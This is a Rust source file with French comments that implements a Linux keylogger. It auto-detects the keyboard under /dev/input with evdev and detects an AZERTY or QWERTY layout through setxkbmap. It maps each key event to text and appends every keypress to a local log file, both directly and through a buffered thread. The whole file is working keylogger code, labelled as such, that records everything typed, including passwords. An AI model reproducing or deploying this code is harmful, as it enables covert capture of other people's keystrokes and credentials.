use evdev::{Device, InputEventKind, Key};
use std::fs::OpenOptions;
use std::io::Write;
use std::process::Command;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

/// 📁 Écrit dans src/Logs/log.log
pub fn write_plain_log(data: &str) {
    let log_path = std::env::current_exe()
        .expect("❌ Chemin exécutable KO")
        .parent().unwrap().parent().unwrap().parent().unwrap()
        .join("src/Logs/log.log");

    std::fs::create_dir_all(log_path.parent().unwrap())
        .expect("❌ Création dossier Logs KO");

    let mut file = OpenOptions::new().create(true).append(true).open(&log_path)
        .expect("❌ Ouverture log KO");

    writeln!(file, "{}", data).expect("❌ Écriture log KO");
}

/// 🔍 Détecte le clavier physique
pub fn detect_keyboard_device() -> Option<String> {
    for entry in std::fs::read_dir("/dev/input/").ok()? {
        if let Ok(entry) = entry {
            let path = entry.path();
            if path.to_string_lossy().contains("event") {
                if let Ok(dev) = Device::open(&path) {
                    let keys = dev.supported_keys();
                    if keys.map_or(false, |k| k.contains(Key::KEY_A) && k.contains(Key::KEY_ENTER)) {
                        println!("🎹 Clavier détecté: {} → {}", dev.name().unwrap_or("unknown"), path.display());
                        return Some(path.to_string_lossy().into());
                    }
                }
            }
        }
    }
    None
}

/// 🌐 Détecte le layout via setxkbmap -print
pub fn detect_keyboard_layout() -> bool {
    let output = Command::new("setxkbmap").arg("-print").output()
        .expect("❌ setxkbmap KO");
    let stdout = String::from_utf8_lossy(&output.stdout);
    stdout.contains("fr")
}

/// 🔡 Mappe scancode QWERTY → caractère correct pour layout
/// 🔡 Mappe scancode QWERTY → caractère correct pour layout
fn map_key(key: Key, is_azerty: bool) -> String {
    match key {
        // Lettres impactées AZERTY
        Key::KEY_A => if is_azerty { "q" } else { "a" }.into(),
        Key::KEY_Q => if is_azerty { "a" } else { "q" }.into(),
        Key::KEY_W => if is_azerty { "z" } else { "w" }.into(),
        Key::KEY_Z => if is_azerty { "w" } else { "z" }.into(),
        Key::KEY_M => if is_azerty { ";" } else { "m" }.into(),

        // Lettres inchangées
        Key::KEY_B => "b".into(),
        Key::KEY_C => "c".into(),
        Key::KEY_D => "d".into(),
        Key::KEY_E => "e".into(),
        Key::KEY_F => "f".into(),
        Key::KEY_G => "g".into(),
        Key::KEY_H => "h".into(),
        Key::KEY_I => "i".into(),
        Key::KEY_J => "j".into(),
        Key::KEY_K => "k".into(),
        Key::KEY_L => "l".into(),
        Key::KEY_N => "n".into(),
        Key::KEY_O => "o".into(),
        Key::KEY_P => "p".into(),
        Key::KEY_R => "r".into(),
        Key::KEY_S => "s".into(),
        Key::KEY_T => "t".into(),
        Key::KEY_U => "u".into(),
        Key::KEY_V => "v".into(),
        Key::KEY_X => "x".into(),
        Key::KEY_Y => "y".into(),

        // Chiffres et symboles simples
        Key::KEY_1 => if is_azerty { "&" } else { "1" }.into(),
        Key::KEY_2 => if is_azerty { "é" } else { "2" }.into(),
        Key::KEY_3 => if is_azerty { "\"" } else { "3" }.into(),
        Key::KEY_4 => if is_azerty { "'" } else { "4" }.into(),
        Key::KEY_5 => if is_azerty { "(" } else { "5" }.into(),
        Key::KEY_6 => if is_azerty { "-" } else { "6" }.into(),
        Key::KEY_7 => if is_azerty { "è" } else { "7" }.into(),
        Key::KEY_8 => if is_azerty { "_" } else { "8" }.into(),
        Key::KEY_9 => if is_azerty { "ç" } else { "9" }.into(),
        Key::KEY_0 => if is_azerty { "à" } else { "0" }.into(),

        // Autres touches
        Key::KEY_SPACE => " ".into(),
        Key::KEY_ENTER => "\n".into(),
        Key::KEY_BACKSPACE => "[BACKSPACE]".into(),
        Key::KEY_TAB => "\t".into(),
        Key::KEY_ESC => "[ESC]".into(),
        Key::KEY_SEMICOLON => ";".into(),
        Key::KEY_COMMA => ",".into(),
        Key::KEY_DOT => ".".into(),
        Key::KEY_MINUS => "-".into(),
        Key::KEY_EQUAL => "=".into(),
        Key::KEY_APOSTROPHE => "'".into(),
        Key::KEY_SLASH => "/".into(),
        Key::KEY_BACKSLASH => "\\".into(),
        Key::KEY_GRAVE => "`".into(),
        Key::KEY_LEFTBRACE => "[".into(),
        Key::KEY_RIGHTBRACE => "]".into(),

        // Contrôles & fonction
        Key::KEY_CAPSLOCK => "[CAPSLOCK]".into(),
        Key::KEY_LEFTSHIFT | Key::KEY_RIGHTSHIFT => "[SHIFT]".into(),
        Key::KEY_LEFTCTRL | Key::KEY_RIGHTCTRL => "[CTRL]".into(),
        Key::KEY_LEFTALT | Key::KEY_RIGHTALT => "[ALT]".into(),
        Key::KEY_LEFTMETA | Key::KEY_RIGHTMETA => "[META]".into(),
        Key::KEY_DELETE => "[DEL]".into(),
        Key::KEY_INSERT => "[INS]".into(),
        Key::KEY_HOME => "[HOME]".into(),
        Key::KEY_END => "[END]".into(),
        Key::KEY_PAGEUP => "[PGUP]".into(),
        Key::KEY_PAGEDOWN => "[PGDN]".into(),
        Key::KEY_UP => "[UP]".into(),
        Key::KEY_DOWN => "[DOWN]".into(),
        Key::KEY_LEFT => "[LEFT]".into(),
        Key::KEY_RIGHT => "[RIGHT]".into(),
        Key::KEY_F1 => "[F1]".into(),
        Key::KEY_F2 => "[F2]".into(),
        Key::KEY_F3 => "[F3]".into(),
        Key::KEY_F4 => "[F4]".into(),
        Key::KEY_F5 => "[F5]".into(),
        Key::KEY_F6 => "[F6]".into(),
        Key::KEY_F7 => "[F7]".into(),
        Key::KEY_F8 => "[F8]".into(),
        Key::KEY_F9 => "[F9]".into(),
        Key::KEY_F10 => "[F10]".into(),
        Key::KEY_F11 => "[F11]".into(),
        Key::KEY_F12 => "[F12]".into(),
	
	
        _ => format!("[{:?}]", key),
    }
}



/// 🎯 Keylogger final
pub fn start_keylogger(device_path: &str, _passphrase: &str) {
    let path = if device_path == "auto" {
        detect_keyboard_device().expect("❌ Aucun clavier détecté.")
    } else {
        device_path.to_string()
    };

    let mut dev = Device::open(&path).expect("❌ Ouverture device KO");
    println!("[*] Keylogger sur {}", path);

    write_plain_log("[*] Keylogger lancé\n");
    let buffer = Arc::new(Mutex::new(String::new()));
    let buffer_clone = Arc::clone(&buffer);

    let azerty = detect_keyboard_layout();
    println!("🌐 Layout : {}", if azerty { "AZERTY" } else { "QWERTY" });

    thread::spawn(move || loop {
        thread::sleep(Duration::from_secs(5));
        let mut buf = buffer_clone.lock().unwrap();
        if !buf.is_empty() {
            write_plain_log(&buf);
            buf.clear();
        }
    });

    loop {
        if let Ok(events) = dev.fetch_events() {
            for ev in events {
                if let InputEventKind::Key(key) = ev.kind() {
                    if ev.value() == 1 {
			    let mapped = map_key(key, azerty);
			    println!("⌨️ Touche mappée : {}", mapped);

			    {
				let mut buf = buffer.lock().unwrap();
				buf.push_str(&mapped);
			    }

			    write_plain_log(&mapped);
			}
                }
            }
        }
        thread::sleep(Duration::from_millis(10));
    }
}
